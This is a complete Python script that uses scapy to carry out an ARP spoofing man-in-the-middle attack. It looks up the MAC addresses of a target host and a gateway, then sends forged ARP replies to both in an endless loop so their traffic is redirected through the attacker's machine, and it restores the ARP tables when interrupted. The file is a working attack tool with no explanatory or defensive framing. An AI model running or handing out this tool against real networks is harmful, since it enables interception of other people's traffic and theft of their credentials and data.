#!/usr/bin/env python3
import scapy.all as scapy
import argparse
import time

def program():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--target", dest="ip", required=True, help="local ip-address")
    parse.add_argument("-r", "--route", dest="route", required=True, help="enter network gateway")
    return parse.parse_args()

def macadr(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/request
    receivedList = scapy.srp(packet, verbose=False, timeout=1)[0]
    if receivedList:
        return receivedList[0][1].hwsrc
    else:
        return None

def spoof(target, targetMac, router):
    if targetMac is None:
        print(f"[-] error: could not get MAC for {target}")
        return
    response = scapy.ARP(op=2, pdst=target, hwdst=targetMac, psrc=router)
    packet = scapy.Ether(dst=targetMac) / response
    scapy.sendp(packet, verbose=False)

def restore(device, deviceMac, source, sourceMac):
    if deviceMac is None or sourceMac is None:
        print(f"[-] error: could not restore ARP table")
        return
    response = scapy.ARP(op=2, pdst=device, hwdst=deviceMac, psrc=source, hwsrc=sourceMac)
    packet = scapy.Ether(dst=deviceMac) / response
    scapy.sendp(packet, count=3, verbose=False)

args = program()
count = 0
targetMac = macadr(args.ip)
routerMac = macadr(args.route)

if targetMac is None or routerMac is None:
    print("[-] failed: could not find MAC address")
    exit()

try:
    while True:
        spoof(args.ip, targetMac, args.route)
        spoof(args.route, routerMac, args.ip)
        count += 2
        print(f"\r[+] packets sent: {count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[~] updating ARP table to default")
    restore(args.ip, targetMac, args.route, routerMac)
    restore(args.route, routerMac, args.ip, targetMac)
    print("[+] restore complete")
